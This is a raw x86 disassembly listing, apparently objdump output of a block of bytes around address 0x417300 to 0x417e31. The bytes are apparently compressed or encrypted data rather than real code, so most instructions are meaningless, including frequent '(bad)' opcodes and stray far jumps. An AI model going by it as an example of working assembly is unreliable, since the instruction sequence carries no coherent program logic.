  417307:	outs   dx,BYTE PTR ds:[esi]
  417308:	scas   al,BYTE PTR es:[edi]
  417309:	pop    DWORD PTR [edx]
  41730b:	add    eax,0x1124615c
  417310:	cmp    BYTE PTR [esi],bh
  417312:	push   esi
  417313:	xor    BYTE PTR [esi+0x61],al
  417316:	retf   
  417317:	push   cs
  417318:	mov    esi,0x65c9c059
  41731d:	cwde   
  41731e:	loopne 0x4172ca
  417320:	or     cl,BYTE PTR [ebp+0x42]
  417323:	fild   WORD PTR [ecx]
  417325:	ins    DWORD PTR es:[edi],dx
  417326:	cmp    BYTE PTR [edi],ah
  417328:	sbb    DWORD PTR [edi+0x460f22b1],0x28
  41732f:	fcom   st(3)
  417331:	or     esi,DWORD PTR [ecx+0x5bed588d]
  417337:	add    edi,DWORD PTR [edx]
  417339:	sbb    DWORD PTR [edx-0x35],esp
  41733c:	cmp    eax,0x39273053
	...
  4173b1:	add    BYTE PTR [eax],al
  4173b3:	add    bl,dh
  4173b5:	inc    ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x52
  4173c1:	sahf   
  4173c2:	xchg   edx,eax
  4173c3:	int3   
  4173c4:	jns    0x4173c3
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	cmc    
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    BYTE PTR ds:0xa3cdc506,dh
  4173d1:	and    al,0xc3
  4173d3:	stos   BYTE PTR es:[edi],al
  4173d4:	ror    BYTE PTR [eax+0x5b],0xa2
  4173d8:	cmp    BYTE PTR [ebp+0x5f],cl
  4173db:	jo     0x417450
  4173dd:	(bad)
  4173e0:	mov    ds:0xed9573e0,eax
  4173e5:	aas    
  4173e6:	push   ss
  4173e7:	(bad)  
  4173e9:	add    eax,0x1177678f
  4173ee:	sbb    esp,DWORD PTR [ebx]
  4173f0:	xlat   BYTE PTR ds:[ebx]
  4173f1:	jno    0x4173d9
  4173f3:	fadd   QWORD PTR [ebx]
  4173f5:	int3   
  4173f6:	mov    dl,0xfd
  4173f8:	pop    ecx
  4173f9:	imul   edi,DWORD PTR gs:[esp+ecx*2-0x74],0x8635cc03
  417402:	(bad)  
  417403:	sahf   
  417404:	dec    eax
  417405:	loop   0x417475
  417407:	cdq    
  417408:	dec    ecx
  417409:	cmp    BYTE PTR [eax+0x7b],0xf8
  41740d:	fs dec edi
  41740f:	(bad)  
  417410:	push   esi
  417411:	es push esi
  417413:	shl    esp,cl
  417415:	aad    0x4d
  417417:	mov    ah,0xde
  417419:	and    ch,BYTE PTR [edi-0x2d59fbdf]
  41741f:	in     eax,0x76
  417421:	pusha  
  417422:	dec    ecx
  417423:	dec    edi
  417424:	fs test eax,0x8d7cbe45
  41742a:	out    0x5a,al
  41742c:	jmp    FWORD PTR [ebx]
  41742e:	mov    esi,0x4fe50383
  417433:	cdq    
  417434:	or     BYTE PTR [ecx-0x1e],dh
  417437:	pop    edx
  417438:	or     ch,dh
  41743a:	scas   eax,DWORD PTR es:[edi]
  41743b:	fcomi  st,st(2)
  41743d:	jmp    0x4174b4
  41743f:	mov    ebp,0x26ed7d33
  417444:	pop    ebp
  417445:	pop    esi
  417446:	fnstsw WORD PTR [eax+eiz*8+0x34e4d1cf]
  41744d:	loope  0x4173ea
  41744f:	adc    ah,BYTE PTR [edi+eax*2-0x2f]
  417453:	popf   
  417454:	xor    al,BYTE PTR [edx+0x34aac234]
  41745a:	repz jb 0x41745f
  41745d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41745e:	cwde   
  41745f:	jo     0x417451
  417461:	xor    DWORD PTR ss:[ebx-0x4ea08d3d],esi
  417468:	stos   BYTE PTR es:[edi],al
  417469:	(bad)  
  41746a:	daa    
  41746b:	popf   
  41746c:	outs   dx,DWORD PTR ds:[esi]
  41746d:	enter  0x905b,0xc7
  417471:	les    edi,FWORD PTR [edx+0x18]
  417474:	pop    eax
  417475:	mov    eax,ds:0xa35ac61d
  41747a:	mov    ds:0xe02ddfe7,al
  41747f:	int3   
  417480:	and    BYTE PTR [esi],dl
  417482:	and    ebx,DWORD PTR [ebp-0x9bb0832]
  417488:	imul   edi,ebp,0xffffffa8
  41748b:	xchg   ebx,eax
  41748c:	push   edi
  41748d:	mov    ds:0x3013ad63,al
  417492:	mov    ecx,0x4576c52a
  417497:	test   DWORD PTR gs:[ebp+0x15],esi
  41749b:	mov    dl,0x61
  41749d:	dec    ecx
  41749e:	out    0xad,al
  4174a0:	aaa    
  4174a1:	dec    esp
  4174a2:	fst    QWORD PTR [ebx]
  4174a4:	add    al,0xe
  4174a6:	mov    eax,0xdef244c
  4174ab:	jecxz  0x417459
  4174ad:	pop    esp
  4174ae:	imul   ebp,DWORD PTR [ebp+0x3a],0x44b50d56
  4174b5:	cmp    ebp,esi
  4174b7:	in     eax,0xb4
  4174b9:	xchg   DWORD PTR [ecx+0x286e89a0],esp
  4174bf:	mov    ?,WORD PTR [ebp+0x0]
	...
  417532:	add    BYTE PTR [eax],al
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0xb1873b7a
  417542:	xor    DWORD PTR ds:0xfe6e,0xfffffff5
  417549:	add    BYTE PTR [eax],al
  41754b:	add    dh,cl
  41754d:	lds    esp,FWORD PTR [ecx+eiz*2]
  417550:	add    al,0xed
  417552:	adc    esp,DWORD PTR [ecx+0x1c5e0008]
  417558:	and    al,0x27
  41755a:	xchg   esi,eax
  41755b:	cld    
  41755c:	pop    esp
  41755d:	leave  
  41755e:	(bad)  
  417560:	jmp    0x2fd2:0x35f59e0c
  417567:	cmp    ebp,DWORD PTR [esi+eax*2+0x25]
  41756b:	sub    DWORD PTR [esi],edx
  41756d:	add    al,0x1e
  41756f:	cwde   
  417570:	dec    ebx
  417571:	and    eax,0xda9ecb25
  417576:	mov    ebx,0x5f011989
  41757b:	icebp  
  41757c:	(bad)  
  41757d:	aad    0x5
  41757f:	daa    
  417580:	or     eax,0x21461c36
  417585:	cmovge ecx,ebp
  417588:	cwde   
  417589:	xchg   esp,eax
  41758a:	jnp    0x41756c
  41758c:	aam    0x1e
  41758e:	sbb    eax,0xe611e188
  417593:	push   0x7eee0f74
  417598:	inc    eax
  417599:	(bad)  
  41759b:	(bad)  
  41759c:	repz leave 
  41759e:	dec    esi
  41759f:	ficom  WORD PTR [ebx]
  4175a1:	mov    BYTE PTR [ecx],ch
  4175a3:	dec    BYTE PTR [ecx]
  4175a5:	ret    0xc09e
  4175a8:	dec    esi
  4175a9:	mov    ds:0xd8f3e2b0,al
  4175ae:	xchg   ecx,eax
  4175af:	push   ecx
  4175b0:	pop    ebx
  4175b1:	mov    eax,DWORD PTR [ebp+0x76cd4730]
  4175b7:	inc    ebx
  4175b8:	mov    bh,0x23
  4175ba:	ret    
  4175bb:	push   eax
  4175bc:	xchg   esp,eax
  4175bd:	scas   eax,DWORD PTR es:[edi]
  4175be:	push   edi
  4175bf:	shr    DWORD PTR [ebx-0x2e],cl
  4175c2:	jno    0x4175b5
  4175c4:	mov    dl,BYTE PTR [ebx]
  4175c6:	push   0xfd54fb80
  4175cb:	xor    eax,0xec7abb24
  4175d0:	(bad)  
  4175d1:	xchg   esi,eax
  4175d2:	imul   edx,DWORD PTR [ebp-0x544d6df0],0xfc027468
  4175dc:	push   ebp
  4175dd:	jns    0x417648
  4175df:	pop    es
  4175e0:	cmp    BYTE PTR ds:0x3550baab,ah
  4175e6:	fdiv   QWORD PTR ds:0x7d2c451b
  4175ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ed:	mov    ds:0x7e5b5c08,eax
  4175f2:	mov    edx,0x2751641d
  4175f7:	dec    edx
  4175f8:	repnz mov eax,0xb47cadfb
  4175fe:	jecxz  0x417591
  417600:	mov    dh,0xf0
  417602:	bound  edi,QWORD PTR [eax]
  417604:	aaa    
  417605:	daa    
  417606:	sub    al,0x22
  417608:	mov    dl,0x2e
  41760a:	dec    edi
  41760b:	push   esi
  41760c:	stos   WORD PTR es:[edi],ax
  41760e:	hlt    
  41760f:	out    0xbb,eax
  417611:	sub    eax,0x5c9fd232
  417616:	jb     0x417673
  417618:	test   eax,0xe8ab7d7d
  41761d:	cmp    bl,BYTE PTR [ecx+0x72]
  417620:	cmp    BYTE PTR [edx-0x4bd894b0],bl
  417626:	retf   0x86da
  417629:	lea    esi,[ecx]
  41762b:	add    al,0xb8
  41762d:	lahf   
  41762e:	in     al,dx
  41762f:	pop    edx
  417630:	add    eax,0xdc81bc20
  417635:	arpl   WORD PTR [ecx+0x21],cx
  417638:	push   ss
  417639:	mov    ebx,DWORD PTR [eax+0x786930b2]
  41763f:	sbb    edx,ecx
	...
  4176b1:	add    BYTE PTR [eax],al
  4176b3:	add    ah,al
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	mov    ebx,edx
  4176c2:	or     BYTE PTR [esi+0xff63],ah
  4176c8:	cmc    
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    bl,ah
  4176cd:	mov    bh,0x39
  4176cf:	retf   0xf2ac
  4176d2:	mul    BYTE PTR [edi-0x73]
  4176d5:	jbe    0x4176e1
  4176d7:	pushf  
  4176d8:	int    0x75
  4176da:	or     eax,0x141f9545
  4176df:	cdq    
  4176e0:	fcomp  QWORD PTR [esi]
  4176e2:	sub    al,0xea
  4176e4:	sbb    eax,0xa410c643
  4176e9:	stos   DWORD PTR es:[edi],eax
  4176ea:	call   0x1b4d337d
  4176ef:	aad    0xf2
  4176f1:	fidivr DWORD PTR [eax]
  4176f3:	stos   BYTE PTR es:[edi],al
  4176f4:	sub    ah,dl
  4176f6:	and    BYTE PTR [edx],ch
  4176f8:	or     BYTE PTR [ebp+ebp*1+0x7c3b5e06],dl
  4176ff:	push   edx
  417700:	shl    esp,cl
  417702:	dec    esp
  417703:	push   esi
  417704:	pushf  
  417705:	lea    edx,[edx]
  417707:	aam    0xa5
  417709:	lods   al,BYTE PTR ds:[esi]
  41770a:	sbb    eax,0x10d622a
  41770f:	mov    al,BYTE PTR [ecx-0x14]
  417712:	ss pop edx
  417714:	sbb    ch,0x44
  417717:	inc    ecx
  417718:	dec    esi
  417719:	mov    edx,0xecb73315
  41771e:	fldcw  WORD PTR [ecx+0x21a7a5c9]
  417724:	pop    ss
  417725:	loop   0x417709
  417727:	jge    0x417746
  417729:	int3   
  41772a:	dec    esp
  41772b:	jb     0x417727
  41772d:	dec    esi
  41772e:	jo     0x41776c
  417730:	mov    edi,0x21ea3ece
  417735:	stos   DWORD PTR es:[edi],eax
  417736:	out    0x36,al
  417738:	repnz popa 
  41773a:	pop    edi
  41773b:	fsubr  DWORD PTR [ebp-0xc54e2a4]
  417741:	dec    esp
  417742:	xor    BYTE PTR [esi-0x433ed1ee],dl
  417748:	or     ebp,DWORD PTR [eax-0xf29a6eb]
  41774e:	or     eax,0x9cf7521f
  417753:	cdq    
  417754:	xchg   esi,eax
  417755:	inc    ebp
  417756:	push   edx
  417757:	xchg   edi,eax
  417758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417759:	iret   
  41775a:	mov    DWORD PTR [ecx+edx*1-0x3d],edx
  41775e:	pop    ds
  41775f:	std    
  417760:	and    al,0x4f
  417762:	repnz cmp al,0x73
  417765:	xchg   ecx,eax
  417766:	sub    ah,ch
  417768:	ret    0xca9f
  41776b:	in     al,dx
  41776c:	push   edx
  41776d:	and    al,0x25
  41776f:	xor    dl,ch
  417771:	jne    0x417723
  417773:	sub    esp,edx
  417775:	in     eax,dx
  417776:	xchg   edx,eax
  417777:	inc    eax
  417778:	in     eax,dx
  417779:	sbb    BYTE PTR [edx],0xc
  41777c:	mov    BYTE PTR [ecx-0x7aa459cb],ch
  417782:	cmc    
  417783:	jno    0x417722
  417785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417786:	adc    esp,DWORD PTR [esi]
  417788:	or     DWORD PTR [esi],ebp
  41778a:	ins    DWORD PTR es:[edi],dx
  41778b:	dec    ecx
  41778c:	(bad)  
  41778d:	cmc    
  41778e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41778f:	repnz sub dh,BYTE PTR [eax+0x69]
  417793:	pop    ebx
  417794:	add    ah,BYTE PTR [edx+0x22]
  417797:	in     eax,0xee
  417799:	daa    
  41779a:	xor    BYTE PTR [edi],ah
  41779c:	fwait
  41779d:	dec    edi
  41779e:	lock inc ebp
  4177a0:	mov    esi,0x250ac074
  4177a5:	ret    
  4177a6:	xor    ebx,ebx
  4177a8:	ss test al,0x69
  4177ab:	rcr    DWORD PTR [eax],1
  4177ad:	stos   BYTE PTR es:[edi],al
  4177ae:	adc    DWORD PTR [esi*2-0x696a50d6],ebx
  4177b5:	repz addr16 call 0xfe6d:0xb5018e62
  4177be:	pushf  
  4177bf:	addr16 dec esp
	...
  417831:	add    BYTE PTR [eax],al
  417833:	add    cl,dl
  417835:	scas   eax,DWORD PTR es:[edi]
  417836:	push   es
  417837:	repz jle 0x417835
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x407d6e99
  417841:	outs   dx,DWORD PTR ds:[esi]
  417842:	adc    al,0x79
  417844:	pop    eax
  417845:	add    BYTE PTR [ecx],al
  417847:	add    ch,dh
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [edx+0x60],ah
  41784e:	fdivr  st(5),st
  417850:	mov    ebx,0x5fe58ac4
  417855:	and    al,0x1e
  417857:	mov    ds:0x470679f1,al
  41785c:	fcomp  QWORD PTR [ecx+ebx*4+0x4b]
  417860:	mul    BYTE PTR [edx]
  417862:	jo     0x41788c
  417864:	or     esi,DWORD PTR [eax]
  417866:	xchg   ecx,eax
  417867:	dec    ebx
  417868:	(bad)  
  417869:	mov    ebp,DWORD PTR [edi+0x35d7d72b]
  41786f:	add    esp,DWORD PTR [eax]
  417871:	cmp    BYTE PTR [edi],dh
  417873:	retf   
  417874:	mov    dl,0x33
  417876:	iret   
  417877:	adc    esi,esp
  417879:	mov    edx,0x7a67033c
  41787e:	jg     0x4178b0
  417880:	dec    edx
  417881:	mov    al,ds:0x701c4997
  417886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417887:	pusha  
  417888:	lods   al,BYTE PTR ds:[esi]
  417889:	(bad)  
  41788a:	push   cs
  41788b:	cmp    bh,bl
  41788d:	mov    edx,esi
  41788f:	retf   
  417890:	and    bl,BYTE PTR [ecx-0x1c00c910]
  417896:	push   ecx
  417897:	sbb    al,0x66
  417899:	ds jmp 0x488e:0x160b39c4
  4178a1:	loop   0x41786e
  4178a3:	jne    0x4178b1
  4178a5:	cmp    esi,esp
  4178a7:	push   edi
  4178a8:	inc    ebp
  4178a9:	retf   0xd0e3
  4178ac:	mov    al,0x1a
  4178ae:	pop    eax
  4178af:	mov    dl,0x74
  4178b1:	ja     0x4178e4
  4178b3:	mov    cl,0x15
  4178b5:	push   edi
  4178b6:	jp     0x417870
  4178b8:	retf   
  4178b9:	mov    esp,0xd9d97ebf
  4178be:	cmp    BYTE PTR [edi],ch
  4178c0:	(bad)  [ebp-0x8]
  4178c3:	cmp    ebp,DWORD PTR [ebp-0x1e8fd416]
  4178c9:	mov    ecx,0x92a28c7c
  4178ce:	test   al,0x7d
  4178d0:	stos   DWORD PTR es:[edi],eax
  4178d1:	imul   esp,ebx,0x370c5cab
  4178d7:	stc    
  4178d8:	xchg   edi,eax
  4178d9:	test   DWORD PTR [ebx-0x16],esp
  4178dc:	std    
  4178dd:	sub    dl,BYTE PTR [edx-0x7bee2756]
  4178e3:	jmp    0xadc4:0xe8ddc0a2
  4178ea:	ds (bad) 
  4178ec:	add    WORD PTR [ecx-0x165818a4],dx
  4178f3:	pop    ss
  4178f4:	mov    eax,ds:0x6357033e
  4178f9:	enter  0x5130,0xf
  4178fd:	xchg   ebp,eax
  4178fe:	mov    bl,0x83
  417900:	push   es
  417901:	xchg   ecx,eax
  417902:	xor    DWORD PTR [ecx+0x16],ebp
  417905:	pop    ss
  417906:	push   edx
  417907:	or     al,0xfa
  417909:	push   ebx
  41790a:	inc    eax
  41790b:	xchg   edx,eax
  41790c:	loopne 0x4178ca
  41790e:	xor    BYTE PTR [ecx],al
  417910:	jno    0x41795f
  417912:	addr16 xor ebx,0xbcd9483f
  417919:	or     ebx,edi
  41791b:	(bad)  
  41791c:	lds    edx,FWORD PTR [eax-0x4c5c2cb2]
  417922:	rol    BYTE PTR [esi-0x4b],1
  417925:	lea    edi,[edi]
  417927:	enter  0x9acb,0xab
  41792b:	scas   eax,DWORD PTR es:[edi]
  41792c:	out    0x68,eax
  41792e:	mov    ds:0xb2cb5b7,eax
  417933:	dec    edx
  417934:	ret    0x1920
  417937:	mov    es,WORD PTR [ecx]
  417939:	clc    
  41793a:	in     al,0x63
  41793c:	or     al,0x28
  41793e:	jp     0x41797b
  417940:	jbe    0x417942
	...
  4179b2:	add    BYTE PTR [eax],al
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x16e2c980]
  4179c2:	dec    esi
  4179c3:	enter  0x14d,0x1
  4179c7:	add    ch,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    ah,bl
  4179cd:	out    0x7d,al
  4179cf:	stc    
  4179d0:	mov    edi,0x1751ba3c
  4179d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179d6:	mov    BYTE PTR [esi+0x4d3b6991],dh
  4179dc:	ficom  DWORD PTR [edi+0x20]
  4179df:	mov    bh,0x6b
  4179e1:	sti    
  4179e2:	jecxz  0x417992
  4179e4:	dec    ecx
  4179e5:	mov    ebx,0x6dbddd9b
  4179ea:	comiss xmm4,xmm2
  4179ed:	cld    
  4179ee:	sub    esp,DWORD PTR [esi]
  4179f0:	loopne 0x4179c2
  4179f2:	mov    ch,0x5e
  4179f4:	sub    dl,al
  4179f6:	or     BYTE PTR ds:0xbba6a09c,dl
  4179fc:	dec    edi
  4179fd:	dec    ebp
  4179fe:	mov    ebp,0x2d6fe6
  417a03:	inc    ebp
  417a04:	fimul  WORD PTR [ebx+ebp*1]
  417a07:	push   0xda477609
  417a0c:	sbb    eax,0xf92610a6
  417a11:	icebp  
  417a12:	jecxz  0x417a70
  417a14:	jle    0x417a53
  417a16:	inc    eax
  417a17:	xchg   ebx,eax
  417a18:	pop    es
  417a19:	jo     0x4179a0
  417a1b:	mov    fs,WORD PTR es:[ebp-0x55]
  417a1f:	jle    0x417a33
  417a21:	mov    ?,WORD PTR [ebx+0x58ae2753]
  417a27:	jo     0x417a2d
  417a29:	js     0x417a1e
  417a2b:	jecxz  0x4179c1
  417a2d:	in     eax,0x49
  417a2f:	mov    ah,0x52
  417a31:	daa    
  417a32:	sbb    BYTE PTR [esp+eiz*2-0x53],ch
  417a36:	push   ebx
  417a37:	rol    DWORD PTR [ecx-0x7ed69d96],1
  417a3d:	imul   ebx,DWORD PTR [edi],0xffffffb0
  417a40:	call   0x45eb55fe
  417a45:	sub    esp,DWORD PTR [edi+0x45e1a8a2]
  417a4b:	mov    DWORD PTR [esp+ebx*1],0x10eed23d
  417a52:	ja     0x417a6e
  417a54:	shr    DWORD PTR [ecx+0x23677d61],cl
  417a5a:	pop    ds
  417a5b:	mov    edx,0xa9be2723
  417a60:	imul   ecx,DWORD PTR [esi-0x1f],0x93fb68bd
  417a67:	push   esi
  417a68:	mov    ds:0x567187ae,eax
  417a6d:	xchg   DWORD PTR [edi],edi
  417a6f:	punpckhbw mm0,mm6
  417a72:	sub    DWORD PTR [esp+edi*2+0x573f4ada],0xffffffb1
  417a7a:	push   ds
  417a7b:	xor    BYTE PTR [eax+0x4adab46d],0x60
  417a82:	mov    ds:0x841aff34,al
  417a87:	data16 ins BYTE PTR es:[edi],dx
  417a89:	pushf  
  417a8a:	ss push ecx
  417a8c:	jns    0x417ab7
  417a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a8f:	arpl   WORD PTR [ebx],bx
  417a91:	push   0xfffffff4
  417a93:	adc    eax,0xfc0de24d
  417a98:	dec    ecx
  417a99:	sbb    ax,0x2d7
  417a9d:	mov    gs,WORD PTR [eax+ebp*8]
  417aa0:	push   eax
  417aa1:	inc    esi
  417aa2:	cmp    DWORD PTR [ebx-0x112624c8],edi
  417aa8:	mov    eax,0xc81e4423
  417aad:	pop    eax
  417aae:	out    0x11,al
  417ab0:	mov    DWORD PTR [edx],edx
  417ab2:	test   BYTE PTR [edi-0x680a87d],0xf6
  417ab9:	adc    bh,bh
  417abb:	adc    DWORD PTR fs:[edx],ecx
  417abe:	mov    dl,0xe9
  417ac0:	nop
	...
  417b31:	add    BYTE PTR [eax],al
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0x58fef5f7
  417b41:	ret    
  417b42:	jo     0x417b97
  417b44:	inc    edx
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    ch,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    BYTE PTR [edi+0x4a],al
  417b4e:	xchg   esp,eax
  417b4f:	bound  esp,QWORD PTR [eax-0x78900e7f]
  417b55:	test   BYTE PTR [edi],dh
  417b57:	push   ecx
  417b58:	enter  0x6fc2,0xe1
  417b5c:	pop    esi
  417b5d:	push   ecx
  417b5e:	leave  
  417b5f:	cs mov es,edi
  417b62:	vmwrite edi,DWORD PTR [ebx]
  417b65:	pop    esp
  417b66:	ins    BYTE PTR es:[edi],dx
  417b67:	and    BYTE PTR [ebx],bl
  417b69:	repz xor bh,BYTE PTR [edx]
  417b6c:	mov    bl,0xfe
  417b6e:	inc    ecx
  417b6f:	xchg   edx,eax
  417b70:	retf   0x3595
  417b73:	sbb    ah,BYTE PTR [esi+0x12c7c6ce]
  417b79:	add    al,dl
  417b7b:	mov    ebx,DWORD PTR [ebp+edi*1+0x6d4192ed]
  417b82:	ins    BYTE PTR es:[edi],dx
  417b83:	and    al,0xa
  417b85:	push   eax
  417b86:	push   cs
  417b87:	pop    edx
  417b88:	cdq    
  417b89:	call   0xacfa:0xb3f1bd7e
  417b90:	pusha  
  417b91:	aas    
  417b92:	or     al,0x41
  417b94:	jne    0x417b23
  417b96:	sbb    DWORD PTR [edx-0x63],ebx
  417b99:	enter  0x364,0x6c
  417b9d:	xchg   esp,eax
  417b9e:	leave  
  417b9f:	mov    al,ds:0x87e6830a
  417ba4:	mov    dl,0xff
  417ba6:	int    0x68
  417ba8:	loopne 0x417bad
  417baa:	gs leave 
  417bac:	jl     0x417bb4
  417bae:	mov    al,ah
  417bb0:	retf   
  417bb1:	add    BYTE PTR [edx-0x6f],dh
  417bb4:	sbb    eax,DWORD PTR [ecx-0x419c2eaf]
  417bba:	inc    ebp
  417bbb:	dec    esp
  417bbc:	jl     0x417c25
  417bbe:	aad    0x76
  417bc0:	sti    
  417bc1:	icebp  
  417bc2:	lds    ebp,FWORD PTR [esi-0x1f54f554]
  417bc8:	push   ecx
  417bc9:	aas    
  417bca:	(bad)  
  417bcb:	outs   dx,DWORD PTR ds:[esi]
  417bcc:	inc    ebx
  417bcd:	add    ebp,DWORD PTR [eax+0x1cacfe73]
  417bd3:	jg     0x417c2a
  417bd5:	push   0xffffffaa
  417bd7:	jmp    0x8701f0fe
  417bdc:	sub    DWORD PTR [ebp+eax*8+0x8407f74],eax
  417be3:	cmp    eax,0x687d58da
  417be8:	aas    
  417be9:	idiv   DWORD PTR [ebx]
  417beb:	shl    bl,cl
  417bed:	shr    edi,1
  417bef:	stc    
  417bf0:	mov    bl,0x1a
  417bf2:	pushf  
  417bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bf4:	aad    0x85
  417bf6:	fisubr WORD PTR [ebx+0x36]
  417bf9:	pop    eax
  417bfa:	mov    dl,0xfe
  417bfc:	pop    edx
  417bfd:	std    
  417bfe:	mov    es,WORD PTR [ebx+0x5ce19d20]
  417c04:	dec    esp
  417c05:	ins    BYTE PTR es:[edi],dx
  417c06:	add    BYTE PTR [edx],0x81
  417c09:	or     ecx,ebp
  417c0b:	adc    al,BYTE PTR [edx-0x23]
  417c0e:	xchg   dl,bl
  417c10:	sar    dl,1
  417c12:	bound  ebp,QWORD PTR [ebx]
  417c14:	and    dl,BYTE PTR ds:0xfb4abb00
  417c1a:	ds xchg ecx,eax
  417c1c:	xchg   edx,eax
  417c1d:	jbe    0x417bc1
  417c1f:	mov    eax,ds:0xf0f0e740
  417c24:	idiv   DWORD PTR [edi-0xd00b1bc]
  417c2a:	or     al,0x53
  417c2c:	stc    
  417c2d:	js     0x417c32
  417c2f:	and    DWORD PTR [edi+0x60],ebp
  417c32:	out    0x4,eax
  417c34:	(bad)  
  417c36:	add    ecx,0xffffffb4
  417c39:	or     eax,0xb4670cc5
  417c3e:	or     eax,0x2fc6
	...
  417cb3:	add    BYTE PTR [ecx],ah
  417cb5:	xchg   ebx,eax
  417cb6:	mov    DWORD PTR [edi-0x60d84045],ebp
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [ebx],ebx
  417cc1:	inc    ebx
  417cc2:	fucomp st(5)
  417cc4:	aaa    
  417cc5:	add    eax,DWORD PTR [ecx]
  417cc7:	add    ch,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [eax+0x28df9714],ah
  417cd1:	jl     0x417c5a
  417cd3:	jle    0x417d52
  417cd5:	sbb    eax,0xa5112618
  417cda:	xor    edx,eax
  417cdc:	mov    dh,0x13
  417cde:	test   DWORD PTR [edi-0x3a],eax
  417ce1:	mov    edi,DWORD PTR [eax+0x248624e1]
  417ce7:	xchg   edi,eax
  417ce8:	xchg   esp,eax
  417ce9:	mov    ss,WORD PTR [esi]
  417ceb:	sub    BYTE PTR [ecx-0x14da07a9],dh
  417cf1:	bnd jle 0x417c77
  417cf4:	dec    edi
  417cf5:	and    edi,DWORD PTR [edx+0x7b]
  417cf8:	ins    DWORD PTR es:[edi],dx
  417cf9:	cmp    al,0x3b
  417cfb:	dec    ebp
  417cfc:	mov    bl,0x1c
  417cfe:	add    eax,DWORD PTR [eax+0x3b]
  417d01:	test   eax,edx
  417d03:	loopne 0x417d44
  417d05:	xchg   esi,eax
  417d06:	loope  0x417d2a
  417d08:	jp     0x417cf3
  417d0a:	(bad)  
  417d0b:	js     0x417c9a
  417d0d:	inc    esp
  417d0e:	in     al,0x39
  417d10:	in     al,dx
  417d11:	loop   0x417cbc
  417d13:	arpl   sp,ax
  417d15:	shl    BYTE PTR [ebx-0x4f],cl
  417d18:	ins    BYTE PTR es:[edi],dx
  417d19:	mov    esp,0x4029c93c
  417d1e:	dec    eax
  417d1f:	xor    BYTE PTR [edi],0xdf
  417d22:	rcl    DWORD PTR [ecx],cl
  417d24:	cmp    eax,0x1a0bef75
  417d29:	test   al,0xfa
  417d2b:	or     eax,0xa78cdbf3
  417d30:	pop    esp
  417d31:	inc    ebp
  417d32:	loope  0x417db1
  417d34:	jns    0x417cd8
  417d36:	rcl    DWORD PTR [edi+eax*1+0x63],0xe4
  417d3b:	or     ch,BYTE PTR [ebx-0x9]
  417d3e:	pop    ds
  417d3f:	daa    
  417d40:	push   esi
  417d41:	add    DWORD PTR [edx+esi*2-0x303aab2a],edi
  417d48:	push   0xfffffff0
  417d4a:	inc    esi
  417d4b:	clc    
  417d4c:	inc    ebx
  417d4d:	dec    ecx
  417d4e:	adc    BYTE PTR [edi],0xe8
  417d51:	test   al,0x14
  417d53:	push   ebp
  417d54:	xchg   esp,eax
  417d55:	stos   BYTE PTR es:[edi],al
  417d56:	leave  
  417d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d58:	adc    eax,esp
  417d5a:	lods   al,BYTE PTR ds:[esi]
  417d5b:	jecxz  0x417d7e
  417d5d:	fs or  al,0x46
  417d60:	push   esp
  417d61:	adc    DWORD PTR fs:[eax],0x7910e9c0
  417d68:	fwait
  417d69:	cmp    ebx,DWORD PTR [edx-0x9]
  417d6c:	mov    al,0x1e
  417d6e:	out    0xd,al
  417d70:	jp     0x417d41
  417d72:	add    bh,BYTE PTR [ebx]
  417d74:	pop    ss
  417d75:	or     edx,DWORD PTR gs:[esi+0x4]
  417d79:	sbb    DWORD PTR [eax+0x58e2ae46],0x3dc4bfe5
  417d83:	xchg   BYTE PTR [esi-0x32b89b50],dl
  417d89:	jno    0x417d7d
  417d8b:	xor    ecx,ecx
  417d8d:	jno    0x417d8d
  417d8f:	shl    BYTE PTR [ebp-0xfd69e2f],0x10
  417d96:	cmp    ah,BYTE PTR [ecx]
  417d98:	mov    al,0xa0
  417d9a:	push   edi
  417d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d9c:	jp     0x417e14
  417d9e:	sbb    DWORD PTR [eax+0x6b],ecx
  417da1:	xor    ecx,0xfffffffe
  417da4:	jae    0x417d2c
  417da6:	push   edi
  417da7:	pop    edi
  417da8:	lods   al,BYTE PTR ds:[esi]
  417da9:	ss xchg esi,eax
  417dab:	add    esp,DWORD PTR [esi+0x6f]
  417dae:	mov    ds:0xa6e862af,al
  417db3:	add    BYTE PTR [edi],0x6e
  417db6:	test   eax,0xca317ac2
  417dbb:	jne    0x417d67
  417dbd:	outs   dx,DWORD PTR ds:[esi]
  417dbe:	cmp    BYTE PTR [edi-0x74],al
	...
  417e31:	add    BYTE PTR [eax],al
